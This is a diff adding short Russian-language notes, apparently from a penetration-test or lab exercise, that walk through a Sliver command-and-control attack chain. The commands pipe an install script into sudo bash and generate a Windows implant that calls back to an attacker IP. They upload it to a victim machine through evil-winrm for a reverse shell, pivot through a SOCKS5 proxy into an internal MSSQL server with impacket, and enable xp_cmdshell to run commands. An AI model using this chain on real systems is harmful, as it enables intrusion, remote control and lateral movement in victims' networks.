@@ -1,0 +1,45 @@
+#Установка Sliver
+curl https://sliver.sh/install|sudo bash
+
+
+#запускаем 
+sliver
+#создание импланта 
+generate --mtls ip_kali:443 --save /home/explorer/pivot.exe --os windows
+
+#перекидываем имплант на машину жертвы через evil-winrm например
+upload pivot.exe
+
+#на sliver поднимаем листенер 
+mlts -L ip_kali -l 443(порт который указали в импланте)
+#просмотр процессов 
+jobs
+#на скомрометированной машине запускаем, перекиданный ранее имплант
+./pivot.exe
+
+установлено соединение 
+#мы проверяем на sliver
+sessions
+появляется id
+
+#теперь нужно взаимодействовать с сессией
+session -i <id>
+
+получаем обратную оболочку
+
+
+чтобы получить взаимодействие с внутренним сервисом mssql 
+проверяем конфиг /etc/proxychains4.conf
+в конце должна быть хапись
+ socks5 127.0.0.1 1081
+
+
+#на sliver запускаем
+socks5 start
+#теперь нужен коннект с mssql
+proxychains -q impacket-mssqlclient domain.local/'alice.wanderland':'пароль который установили'@127.0.0.1 -windows-auth
+
+теперь нужно подключить xp_cmdshell и подтвердили command execution
+xp_cmdshell whoami
+
+xp_cmdshell whoami /priv
